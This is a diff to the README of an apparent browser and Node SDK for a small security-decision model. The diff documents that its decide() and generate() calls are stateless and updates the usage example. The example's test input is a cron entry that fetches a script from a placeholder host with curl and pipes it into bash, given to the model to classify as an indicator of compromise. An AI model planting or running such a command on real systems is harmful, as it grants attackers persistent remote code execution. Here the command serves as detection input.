@@ -4,8 +4,11 @@ On-device SDK (browser, Node, edge) for **CT0 / alias3-micro-1026** running as O
 [onnxruntime-web](https://onnxruntime.ai/) (WebGPU / WASM). One model, both modes:
 
 - **System 1 — `decide()`**: a yes/no security decision in a single forward (reads logits, no tokens generated).
-- **System 2 — `generate()` / `Chat`**: autoregressive generation (streaming).
+- **System 2 — `generate()`**: autoregressive generation (streaming).
 - **Gate**: escalate from System 1 to System 2 when confidence is below a threshold.
+
+Both are **stateless, single-turn**: each call builds its own prompt from a fresh state — there is no
+conversation/session carried between calls. When you escalate to System 2, pass the context explicitly.
 
 By default it drives the **decode-only recurrent graph** `onnx/model_q4f16_decode.onnx` (~2.73 GB) — the
 one that fits the browser's ~4 GB WASM cap and decodes at O(1)/token. **Requires `onnxruntime-web` ≥ 1.30**
@@ -27,14 +30,17 @@ import { CT0 } from "ct0-edge";
 
 const ct0 = await CT0.load({ repo: "eduardoworrel/ct0-alias3-micro-onnx", onStatus: console.log });
 
+const state = "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash";
+const question = "Is this a suspicious indicator of compromise?";
+
 // System 1 — decision (one forward, reads logits)
-const p = await ct0.decide("path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
-                           "Is this a suspicious indicator of compromise?");
+const p = await ct0.decide(state, question);
 console.log("P(yes) =", p);
 
-// Gate + System 2
+// Gate → System 2. Independent call: generate() doesn't see the decide() above,
+// so pass the context again.
 if (Math.abs(2 * p - 1) < 0.6) {
-  for await (const piece of ct0.generate("Explain the reasoning.")) process.stdout.write(piece);
+  for await (const piece of ct0.generate(`${question}\n${state}\nExplain.`)) process.stdout.write(piece);
 }
 ```
 
